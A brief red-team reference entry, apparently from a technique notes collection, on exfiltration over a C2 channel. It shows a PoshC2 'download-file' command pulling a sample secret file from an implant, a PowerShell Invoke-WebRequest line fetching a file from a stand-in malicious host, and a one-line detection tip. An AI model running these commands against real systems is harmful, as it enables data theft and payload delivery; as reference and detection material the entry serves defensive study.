# [Exfiltration Over Command and Control Channel]()

## Exploit Description: 
Download command in PoshC2


## Exploit syntax:


* Download file directly from implant
```powershell
download-file <file path> 
Example: download-file 'C:\\Users\\Public\\supersecretdata.txt'
```

* Download file from hosted malicious site
```powershell
Invoke-WebRequest -Uri "http://www.Gewgle.com" -OutFile "C:\path\file"
```


## Detection Technique:
* Investigate powershell with the “download” command. Investigate increased data transfer external to the network during a network connection.

